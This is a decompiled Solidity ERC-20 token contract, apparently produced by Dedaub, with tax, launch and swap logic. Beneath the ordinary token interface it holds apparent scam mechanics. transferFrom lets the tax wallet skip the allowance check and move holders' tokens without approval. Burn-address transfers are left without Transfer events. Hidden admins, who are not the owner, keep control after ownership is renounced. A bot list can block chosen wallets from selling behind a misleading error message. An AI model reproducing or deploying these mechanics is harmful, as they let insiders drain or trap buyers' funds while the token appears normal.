// Decompiled by library.dedaub.com
// 2025.10.27 21:53 UTC
// Compiled using the solidity compiler version 0.8.30


// Data structures and variables inferred from the use of storage instructions
mapping (address => uint256) _balanceOf; // STORAGE[0x1]
mapping (address => mapping (address => uint256)) _allowance; // STORAGE[0x2]
mapping (address => bool) _setTaxWallet; // STORAGE[0x3]
mapping (address => bool) mapping_4; // STORAGE[0x4]
uint256 stor_7; // STORAGE[0x7]
uint256 stor_8; // STORAGE[0x8]
uint256 stor_9; // STORAGE[0x9]
uint256 stor_a; // STORAGE[0xa]
uint256 stor_b; // STORAGE[0xb]
uint256 stor_c; // STORAGE[0xc]
uint256 __maxTaxSwap; // STORAGE[0xf]
address _owner; // STORAGE[0x0] bytes 0 to 19
address _transferFrom; // STORAGE[0x5] bytes 0 to 19
address stor_10_0_19; // STORAGE[0x10] bytes 0 to 19
address owner_11_0_19; // STORAGE[0x11] bytes 0 to 19
bool stor_11_20_20; // STORAGE[0x11] bytes 20 to 20
bool stor_11_21_21; // STORAGE[0x11] bytes 21 to 21
bool stor_11_22_22; // STORAGE[0x11] bytes 22 to 22


// Events
OwnershipTransferred(address, address);
Approval(address, address, uint256);
Transfer(address, address, uint256);

function 0x132c(uint256 varg0) private { 
    v0 = _transferFrom.call().value(varg0).gas(2300 * !varg0);
    require(bool(v0), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    return ;
}

function 0x13a8(uint256 varg0, uint256 varg1) private { 
    v0 = _SafeAdd(varg1, varg0);
    require(v0 >= varg1, Error('SafeMath: addition overflow'));
    return v0;
}

function approve(address spender, uint256 amount) public nonPayable { 
    require(msg.data.length - 4 >= 64);
    0x903(amount, spender, msg.sender);
    return True;
}

function 0x1406(bytes varg0, uint256 varg1, uint256 varg2) private { 
    if (varg1) {
        v0 = _SafeDiv(varg2, varg1);
        return v0;
    } else {
        v1 = new bytes[](varg0.length);
        MCOPY(v1.data, varg0.data, varg0.length);
        v1[varg0.length] = 0;
        revert(Error(v1));
    }
}

function 0x1665(uint256 varg0, uint8 varg1) private { 
    v0 = v1 = varg1;
    if (v1) {
        if (varg0) {
            if (varg0 == 1) {
                v2 = v3 = 1;
            } else if (varg0 == 2) {
                require(v1 <= uint8.max, Panic(17)); // arithmetic overflow or underflow
                v2 = v4 = 1 << v1;
            } else if (!((varg0 < 11) & (v1 < 78) | (varg0 < 307) & (v1 < 32))) {
                v5 = v6 = 1;
                while (v0 > 1) {
                    require(varg0 <= uint256.max / varg0, Panic(17)); // arithmetic overflow or underflow
                    if (v0 & 0x1) {
                        v5 *= varg0;
                    }
                    v0 = v0 >> 1;
                    varg0 *= varg0;
                }
                require(v5 <= uint256.max / varg0, Panic(17)); // arithmetic overflow or underflow
                v2 = v7 = varg0 * v5;
            } else {
                v2 = v8 = varg0 ** v1;
            }
        } else {
            v2 = v9 = 0;
        }
    } else {
        v2 = v10 = 1;
    }
    return v2;
}

function _SafeMul(uint256 varg0, uint256 varg1) private { 
    require((varg1 == varg1 * varg0 / varg0) | !varg0, Panic(17)); // arithmetic overflow or underflow
    return varg1 * varg0;
}

function _maxTaxSwap() public nonPayable { 
    return __maxTaxSwap;
}

function _SafeAdd(uint256 varg0, uint256 varg1) private { 
    require(varg0 <= varg1 + varg0, Panic(17)); // arithmetic overflow or underflow
    return varg1 + varg0;
}

function _SafeDiv(uint256 varg0, uint256 varg1) private { 
    require(varg1, Panic(18)); // division by zero
    return varg0 / varg1;
}

function totalSupply() public nonPayable { 
    v0 = 0x1665(10, 9);
    v1 = _SafeMul(10 ** 9, v0);
    return v1;
}

function rescueEther() public nonPayable { 
    require(msg.sender == _owner, Error('Ownable: caller is not the owner'));
    require(this.balance > 0);
    v0 = msg.sender.call().value(this.balance).gas(2300 * !this.balance);
    require(bool(v0), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
}

function transferFrom(address sender, address recipient, uint256 amount) public nonPayable { 
    require(msg.data.length - 4 >= 96);
    0xa26(amount, recipient, sender);
    v0 = v1 = msg.sender != _transferFrom;
    if (msg.sender != _transferFrom) {
        v0 = v2 = owner_11_0_19 == sender;
        if (owner_11_0_19 != sender) {
            v0 = v3 = 57005 != recipient;
        }
    }
    if (v0) {
        v4 = _SafeSub('ERC20: transfer amount exceeds allowance', amount, _allowance[sender][msg.sender]);
        0x903(v4, msg.sender, sender);
    }
    return True;
}

function decimals() public nonPayable { 
    return 9;
}

function balanceOf(address account) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    return _balanceOf[account];
}

function renounceOwnership() public nonPayable { 
    require(msg.sender == _owner, Error('Ownable: caller is not the owner'));
    emit OwnershipTransferred(_owner, 0);
    _owner = 0;
}

function enableTrading() public nonPayable { 
    require(msg.sender == _owner, Error('Ownable: caller is not the owner'));
    require(!stor_11_20_20, Error('Trading is already open'));
    stor_10_0_19 = 0x10ed43c718714eb63d5aa57b78b54704e256024e;
    v0 = 0x1665(10, 9);
    v1 = _SafeMul(10 ** 9, v0);
    0x903(v1, 0x10ed43c718714eb63d5aa57b78b54704e256024e, this);
    v2, /* address */ v3 = stor_10_0_19.factory().gas(msg.gas);
    require(bool(v2), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v3 == address(v3));
    v4, /* address */ v5 = stor_10_0_19.WETH().gas(msg.gas);
    require(bool(v4), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v5 == address(v5));
    v6, /* address */ v7 = address(v3).createPair(address(this), address(v5)).gas(msg.gas);
    require(bool(v6), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v7 == address(v7));
    owner_11_0_19 = v7;
    v8, /* uint256 */ v9, /* uint256 */ v10, /* uint256 */ v11 = stor_10_0_19.addLiquidityETH(address(this), _balanceOf[address(this)], 0, 0, _owner, block.timestamp).value(this.balance).gas(msg.gas);
    require(bool(v8), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 96);
    stor_11_20_20 = 1;
    stor_11_21_21 = 0;
    stor_11_22_22 = 1;
    v12, /* bool */ v13 = owner_11_0_19.approve(stor_10_0_19, uint256.max).gas(msg.gas);
    require(bool(v12), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    require(v13 == bool(v13));
}

function owner() public nonPayable { 
    return _owner;
}

function transfer(address recipient, uint256 amount) public nonPayable { 
    require(msg.data.length - 4 >= 64);
    0xa26(amount, recipient, msg.sender);
    return True;
}

function allowance(address owner, address spender) public nonPayable { 
    require(msg.data.length - 4 >= 64);
    return _allowance[owner][spender];
}

function setTaxWallet(address newTaxWallet) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    require(_setTaxWallet[msg.sender]);
    _transferFrom = newTaxWallet;
}

function updateBot(address wallet, bool isBot) public nonPayable { 
    require(msg.data.length - 4 >= 64);
    require(_setTaxWallet[msg.sender]);
    mapping_4[wallet] = isBot;
}

function 0x903(uint256 varg0, address varg1, address varg2) private { 
    require(varg2, Error('ERC20: approve from the zero address', 'ERC20: approve from the zero address'));
    require(varg1, Error('ERC20: approve to the zero address'));
    _allowance[varg2][varg1] = varg0;
    emit Approval(varg2, varg1, varg0);
    return ;
}

function 0xa26(uint256 varg0, address varg1, address varg2) private { 
    require(varg2, Error('ERC20: transfer from the zero address'));
    require(varg1, Error('ERC20: transfer to the zero address'));
    require(varg0 > 0, Error('Transfer amount must be greater than zero'));
    v0 = v1 = 0;
    v2 = v3 = this != varg2;
    if (this != varg2) {
        v2 = v4 = this != varg1;
    }
    if (v2) {
        if (!stor_11_21_21) {
            if (stor_a > stor_9) {
                v5 = v6 = stor_8;
            } else {
                v5 = v7 = stor_7;
            }
            if (0 - varg0) {
                v8 = v9 = _SafeMul(varg0, v5);
                v10 = _SafeDiv(v9, varg0);
                require(v10 == v5, Error('SafeMath: multiplication overflow'));
            } else {
                v8 = v11 = 0;
            }
            v0 = v12 = 0x1406('SafeMath: division by zero', 100, v8);
        }
        v13 = v14 = owner_11_0_19 == varg2;
        if (v14) {
            v13 = v15 = !_setTaxWallet[varg1];
        }
        if (v13) {
            v13 = v16 = _transferFrom != varg1;
        }
        if (v13) {
            require(varg1 - owner_11_0_19);
            if (stor_b != block.number) {
                stor_c = 0;
                stor_b = block.number;
            }
            v17 = _SafeAdd(stor_c, varg0);
            stor_c = v17;
            require(stor_a + 1, Panic(17)); // arithmetic overflow or underflow
            stor_a += 1;
        }
        v18 = v19 = owner_11_0_19 == varg1;
        if (v19) {
            v18 = v20 = this != varg2;
        }
        if (v18) {
            v21 = new address[](2);
            CALLDATACOPY(v21.data, msg.data.length, 64);
            v22, /* address */ v23 = stor_10_0_19.WETH().gas(msg.gas);
            require(bool(v22), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
            require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
            require(v23 == address(v23));
            require(0 < v21.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
            v24 = v21.data;
            v21[0] = address(v23);
            require(1 < v21.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
            v21[1] = address(this);
            v25 = new address[](v21.length);
            v26 = v27 = v25.data;
            v28 = v29 = v21.data;
            v30 = v31 = 0;
            while (v30 < v21.length) {
                MEM[v26] = address(MEM[v28]);
                v26 += 32;
                v28 = v28 + 32;
                v30 += 1;
            }
            v32, /* uint256 */ v33 = stor_10_0_19.getAmountsOut(0x1b48eb57e000, v25, v34, address(v23)).gas(msg.gas);
            require(bool(v32), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
            RETURNDATACOPY(v33, 0, RETURNDATASIZE());
            MEM[64] = v33 + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0 & RETURNDATASIZE() + 31);
            require(v33 + RETURNDATASIZE() - v33 >= 32);
            require(MEM[v33] <= uint64.max);
            require(v33 + RETURNDATASIZE() > v33 + MEM[v33] + 31);
            require(MEM[v33 + MEM[v33]] <= uint64.max, Panic(65)); // failed memory allocation (too much memory)
            v35 = new uint256[](MEM[v33 + MEM[v33]]);
            require(!((v35 + ((MEM[v33 + MEM[v33]] << 5) + 63 & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) > uint64.max) | (v35 + ((MEM[v33 + MEM[v33]] << 5) + 63 & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) < v35)), Panic(65)); // failed memory allocation (too much memory)
            v36 = v37 = v35.data;
            require(32 + (v33 + MEM[v33] + (MEM[v33 + MEM[v33]] << 5)) <= v33 + RETURNDATASIZE());
            v38 = v39 = v33 + MEM[v33] + 32;
            while (v38 < 32 + (v33 + MEM[v33] + (MEM[v33 + MEM[v33]] << 5))) {
                MEM[v36] = MEM[v38];
                v38 += 32;
                v36 += 32;
            }
            require(1 < v35.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
            v40 = v41 = stor_c < v35[1];
            if (stor_c >= v35[1]) {
                v40 = v42 = stor_b != block.number;
            }
            require(v40, Error('Max Swap Limit'));
        }
        varg0 = v43 = _balanceOf[this];
        v44 = v45 = !stor_11_21_21;
        if (!stor_11_21_21) {
            v44 = v46 = owner_11_0_19 == varg1;
        }
        if (v44) {
            v44 = v47 = stor_11_22_22;
        }
        if (v44) {
            v44 = v48 = _transferFrom != varg2;
        }
        if (v44) {
            require(!mapping_4[tx.origin], Error('ERC20: External call'));
            if (v43) {
                if (v43 > __maxTaxSwap) {
                    varg0 = v49 = __maxTaxSwap;
                }
                if (varg0 <= varg0) {
                }
                stor_11_21_21 = 1;
                v50 = new address[](2);
                CALLDATACOPY(v50.data, msg.data.length, 64);
                require(0 < v50.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
                v51 = v50.data;
                v50[0] = address(this);
                v52, /* address */ v53 = stor_10_0_19.WETH().gas(msg.gas);
                require(bool(v52), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
                require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
                require(v53 == address(v53));
                require(1 < v50.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
                v50[1] = address(v53);
                0x903(varg0, stor_10_0_19, this);
                v54 = new address[](v50.length);
                v55 = v56 = v54.data;
                v57 = v58 = v50.data;
                v59 = v60 = 0;
                while (v59 < v50.length) {
                    MEM[v55] = address(MEM[v57]);
                    v55 += 32;
                    v57 = v57 + 32;
                    v59 += 1;
                }
                require(bool(stor_10_0_19.code.size));
                v61 = stor_10_0_19.swapExactTokensForETHSupportingFeeOnTransferTokens(varg0, 0, v54, address(this), block.timestamp, v34, address(this)).gas(msg.gas);
                require(bool(v61), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
                stor_11_21_21 = 0;
            }
            0x132c(this.balance);
        }
    }
    v62 = _SafeSub('SafeMath: subtraction overflow', varg0, _balanceOf[varg2]);
    _balanceOf[varg2] = v62;
    v63 = _SafeSub('SafeMath: subtraction overflow', v0, varg0);
    v64 = 0x13a8(v63, _balanceOf[varg1]);
    _balanceOf[varg1] = v64;
    if (v0) {
        v65 = 0x13a8(v0, _balanceOf[this]);
        _balanceOf[this] = v65;
        MEM[MEM[64]] = v0;
        emit Transfer(varg2, this, v0);
    }
    if (57005 != varg1) {
        v66 = _SafeSub('SafeMath: subtraction overflow', v0, varg0);
        MEM[MEM[64]] = v66;
        emit Transfer(varg2, varg1, v66);
    }
    return ;
}

function receive() public payable { 
}

function _SafeSub(bytes varg0, uint256 varg1, uint256 varg2) private { 
    if (varg1 <= varg2) {
        require(varg2 - varg1 <= varg2, Panic(17)); // arithmetic overflow or underflow
        return varg2 - varg1;
    } else {
        v0 = new bytes[](varg0.length);
        MCOPY(v0.data, varg0.data, varg0.length);
        v0[varg0.length] = 0;
        revert(Error(v0));
    }
}

function name() public nonPayable { 
    v0 = new bytes[](v1.length);
    MCOPY(v0.data, v1.data, v1.length);
    v0[v1.length] = 0;
    return v0;
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__( function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length < 4) {
        require(!msg.data.length);
        receive();
    } else {
        if (0x715018a6 > function_selector >> 224) {
            if (0x20969d07 > function_selector >> 224) {
                if (0x6fdde03 != function_selector >> 224) {
                    if (0x95ea7b3 == function_selector >> 224) {
                        approve(address,uint256);
                    } else if (0xfaee56f == function_selector >> 224) {
                        _maxTaxSwap();
                    } else {
                        require(0x18160ddd == function_selector >> 224);
                        totalSupply();
                    }
                }
            } else if (0x20969d07 == function_selector >> 224) {
                rescueEther();
            } else if (0x23b872dd == function_selector >> 224) {
                transferFrom(address,address,uint256);
            } else if (0x313ce567 == function_selector >> 224) {
                decimals();
            } else {
                require(0x70a08231 == function_selector >> 224);
                balanceOf(address);
            }
        } else if (0xa9059cbb > function_selector >> 224) {
            if (0x715018a6 == function_selector >> 224) {
                renounceOwnership();
            } else if (0x8a8c523c == function_selector >> 224) {
                enableTrading();
            } else if (0x8da5cb5b == function_selector >> 224) {
                owner();
            } else {
                require(0x95d89b41 == function_selector >> 224);
            }
        } else if (0xa9059cbb == function_selector >> 224) {
            transfer(address,uint256);
        } else if (0xdd62ed3e == function_selector >> 224) {
            allowance(address,address);
        } else if (0xea414b28 == function_selector >> 224) {
            setTaxWallet(address);
        } else {
            require(0xfac1b9bc == function_selector >> 224);
            updateBot(address,bool);
        }
        symbol();
    }
}
